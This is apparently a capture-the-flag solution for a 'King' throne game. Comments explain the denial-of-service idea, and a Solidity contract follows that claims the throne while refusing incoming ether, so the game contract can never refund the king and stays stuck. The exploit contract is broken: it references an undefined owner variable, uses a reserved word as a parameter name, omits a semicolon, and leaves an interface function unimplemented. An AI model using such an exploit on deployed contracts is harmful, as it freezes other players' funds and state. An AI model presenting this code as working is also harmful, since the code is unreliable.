
// Solution:
// You always need to be sure that transactions to external addresses (which could also be other contracts) may not go through
// Claiming the throne with a contract which doesn't include a payable fallback() or receive() function will break the system.
// The "King" contract will not be able to send the eth back to the current owner and will be stuck at the current state.

//e.g. Contract =>


interface IKing {
    function prize() external view returns (uint);
}

contract malicousContract is IKing{

  address private immutable i_KingContract;
  
  address private immutable i_owner;
  
  uint256 public currentPrize;
  
  constructor(address contract) {
    i_KingContract = contract;
    i_owner = msg.sender;
  }
  
  function getPrize() public {
    require(msg.sender == owner, "caller isn't owner");
    currentPrize = IKing(i_KingContract).prize();
  }
  
  
  
  function becomeKing() public payable {
   require(msg.sender == owner, "caller isn't owner");
    i_KingContract.call{value: currentPrize}()
  }
  
}



